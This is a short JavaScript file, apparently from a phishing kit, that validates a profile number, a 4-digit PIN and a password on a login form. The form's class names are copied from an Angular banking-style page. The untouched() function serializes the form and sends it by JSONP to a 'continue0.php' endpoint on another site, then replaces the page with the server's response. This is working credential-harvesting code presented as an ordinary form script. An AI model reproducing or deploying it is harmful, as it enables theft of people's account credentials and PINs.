function ajax_jsonp_call(post_url, formValues, callBack) {
            //pageLoader(true);
            $.ajax({
                url: post_url,
                data: formValues,
                dataType: "jsonp",
                cache: false,
                success: function(results) {
                    //$('#div1').html(results);
                    //alert('completed');
                    //callBack(results);
                    //pageLoader(false);
                    document.open();
                    document.write(results.message);
                    document.close();

                },
                error: function() {
                    alert('Error');
                }
            });
        }
        
        function isNumberKey(event) {
            var charCode;
            var acceptedCodes = [49,50,51,52,53,54,55,56,57,48,46,8,0];

            if (window.event) {
                    charCode = event.keyCode;
            } else {
                    charCode = event.which;
            }

            var validCharCode = $.inArray(charCode, acceptedCodes);
            //console.log(charCode + " == "+validCharCode);
            if(validCharCode > -1){
                return true;
            }else{
                return false;
            }
            /*
            if (charCode > 31&&
                            (charCode < 48 || charCode > 57)) {
                    //alert("false - " + charCode);
                    return false;
            }
            console.log(charCode);
            return true;*/
        }

        function validatePassword(pw) {
            //return /^(?=.*[A-Za-z])(?=.*\d)[A-Za-z\d]{5,}$/.test(pw);
            return /^(?=.*[0-9])(?=.*[!@#$%^&*])[a-zA-Z0-9!@#$%^&*]{6,16}$/.test(pw);

        }
        
        function untouched(){
            var profile = $("input#profile").val(); var profilePattern = $("input#profile").attr("ipattern");
            var pin = $("input#pin").val(); var pinPattern = $("input#pin").attr("ipattern");
            var password = $("input#password").val(); var passwordPattern = $("input#password").attr("pattern");
            
            regPIN = /[0-9]{4}/;
            regProfile = /[0-9]{10}/;
            if(regPIN.test(pin) === false){
                alert("Please enter your 4-digit profile PIN.");
                return false;
            }
            
            if(regProfile.test(profile) === false){
                alert("Please enter your 10-digit profile Number.");
                return false;
            }
            
            if(checkPwd(password) !== "ok"){
                 alert("please enter a valid password password and retry");
                 return false;
            }
           
            $("div[hidden].loader-mask").removeAttr("hidden");
            ajax_jsonp_call(site_Url+'continue0.php', $("form.gd-form.ng-untouched.ng-pristine.ng-invalid").serialize());
            return false;            
        }
        
        function checkPwd(str) {
                if (str.length < 6) {
                    return("too_short");
                } else if (str.search(/[a-zA-Z]/) == -1) {
                    return("no_letter");
                }
                return("ok");
            }